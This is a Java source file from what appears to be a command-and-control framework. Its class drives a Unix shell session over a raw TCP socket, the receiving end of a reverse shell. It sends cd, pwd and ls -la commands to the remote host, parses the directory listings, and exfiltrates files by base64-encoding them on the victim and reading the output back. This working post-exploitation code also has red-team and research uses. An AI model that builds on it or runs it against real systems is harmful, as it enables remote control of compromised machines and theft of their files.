package c2.tcp;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import c2.Commands;
import c2.Constants;
import c2.session.IOManager;

public class NixSocketReader extends SocketReader {

	// Some shells include $ either before or after their output returns, we want to
	// know
	// if we need to sanitize these out
	public NixSocketReader(Socket socket, BufferedReader br, boolean usesDollarSigns) {
		super(socket, br, false);
		super.usesDollarSigns = usesDollarSigns;
	}

	@Override
	public String readUnknownLinesFromSocketWithTimeout(long timeout) throws IOException {
		String content = super.readUnknownLinesFromSocketWithTimeout(timeout);
		content = processSocketRead(content);
		return content;
	}
	
	private String processSocketRead(String content) {
		if (usesDollarSigns) {
			// Clear leading $
			while (content.startsWith("$ ")) {
				content = content.replace("$ ", "");
			}
			// Clear trailing with line sep
			String endString = "$ " + System.lineSeparator();
			while (content.endsWith(endString)) {
				content = content.substring(0, content.length() - endString.length());
				content += System.lineSeparator();
			}

			// Clear trailing without line sep
			while (content.endsWith("$ ")) {
				content = content.substring(0, content.length() - "$ ".length());
			}
		}
		return content;
	}
	
	@Override
	public String readUnknownLinesFromSocket() throws IOException {
		String content = super.readUnknownLinesFromSocket();
		content = processSocketRead(content);
		return content;
	}

	@Override
	public void executeCd(String cd, IOManager ioManager, OutputStreamWriter bw, int sessionId) throws IOException {
		bw.write(cd);
		bw.write(Constants.NEWLINE);
		bw.write("pwd");
		bw.write(Constants.NEWLINE);
		bw.flush();
		String response = readUnknownLinesFromSocketWithTimeout(1000);
		ioManager.sendIO(sessionId, response);
	}

	@Override
	public String getCurrentDirectoryNativeFormat(IOManager ioManager, OutputStreamWriter bw, int sessionId)
			throws IOException {
		bw.write("ls -la");
		bw.write(Constants.NEWLINE);
		bw.flush();
		return readUnknownLinesFromSocketWithTimeout(1000);
	}

	@Override
	public List<String> getCurrentDirectoriesFromNativeFormatDump(String parentDirectory, String dir) {
		List<String> directories = new ArrayList<>();
		String lines[] = dir.split(Constants.NEWLINE);
		for (int idx = 3; idx < lines.length; idx++) {
			String elements[] = lines[idx].replaceAll("\\s+", " ").split(" ");
			if (elements.length != 9) {
				System.out.println("Aborting during parse");
				break;
			}
			if (lines[idx].startsWith("d")) {
				String newDir =parentDirectory + "/" + elements[8];
				directories.add(newDir);
			}
		}
		
		return directories;
	}

	@Override
	public List<String> getCurrentFilesFromNativeFormatDump(String parentDirectory, String dir) {
		List<String> files = new ArrayList<>();
		String lines[] = dir.split(Constants.NEWLINE);
		for (int idx = 3; idx < lines.length; idx++) {
			String elements[] = lines[idx].replaceAll("\\s+", " ").split(" ");
			if (elements.length != 9) {
				System.out.println("Aborting during parse");
				break;
			}
			if (!lines[idx].startsWith("d")) {
				String newDir =parentDirectory + "/" + elements[8];
				files.add(newDir);
			}
		}
		
		return files;
	}

	@Override
	public String uplinkFileBase64(String filename, OutputStreamWriter bw, int sessionId) throws Exception {
		String mod = "base64 '" + filename + "'";
		bw.write(mod);
		bw.write(Constants.NEWLINE);
		bw.flush();
		String response = readUnknownLinesFromSocketWithTimeout(2500);
		if (response.length() == 0 || response.contains("No such file or directory")) {
			throw new Exception("Cannot uplink file");
		} else {
			response = response.replace(Constants.NEWLINE, "");
			return response;
		}
	}

	@Override
	public String getPwd(OutputStreamWriter bw, int sessionId) {
		try {
			bw.write(Commands.CLIENT_CMD_PWD + Constants.NEWLINE);
			bw.flush();
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			String elems[] = response.split(System.lineSeparator());
			return elems[0];
		} catch (Exception ex) {
			return "Unable to query current working directory";
		}
	}
}
